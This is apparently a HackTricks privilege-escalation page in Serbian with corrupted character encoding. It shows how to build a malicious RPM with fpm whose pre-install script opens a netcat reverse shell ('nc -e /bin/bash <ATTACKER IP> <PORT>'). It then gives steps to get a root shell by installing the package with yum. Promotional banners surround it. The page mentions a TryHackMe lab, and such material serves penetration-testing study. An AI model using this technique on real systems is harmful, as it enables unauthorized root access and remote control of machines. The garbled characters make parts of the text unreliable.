<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite videti **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Dodatni primeri vezani za yum mogu se prona캖i na [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

# Izvr코avanje proizvoljnih komandi putem RPM paketa
## Provera okru쬰nja
Da biste iskoristili ovaj vektor, korisnik mora mo캖i da izvr코ava yum komande kao korisnik sa vi코im privilegijama, tj. root.

### Radni primer ovog vektora
Radni primer ovog napada mo쬰 se prona캖i u sobi [daily bugle](https://tryhackme.com/room/dailybugle) na [tryhackme](https://tryhackme.com).

## Pakovanje RPM-a
U slede캖em odeljku, pokri캖u pakovanje reverzibilne ljuske u RPM koriste캖i [fpm](https://github.com/jordansissel/fpm).

Primer ispod kreira paket koji uklju캜uje okida캜 pre instalacije sa proizvoljnim skriptom koju napada캜 mo쬰 definisati. Kada se instalira, ovaj paket 캖e izvr코iti proizvoljnu komandu. Za demonstraciju sam koristio jednostavan primer reverzibilne netcat ljuske, ali ovo se mo쬰 promeniti po potrebi.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# Hvatanje ljuske
Koriste캖i prethodni primer i pretpostavljaju캖i da se `yum` mo쬰 izvr코iti kao korisnik sa vi코im privilegijama.

1. **Prebacite** rpm na ciljni ra캜unar
2. **Pokrenite** oslu코kiva캜 na va코em lokalnom ra캜unaru, kao 코to je [primer netcat oslu코kiva캜](/shells/shells/linux#netcat)
3. **Instalirajte** ranjiv paket `yum localinstall -y exploited-1.0-1.noarch.rpm`


<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
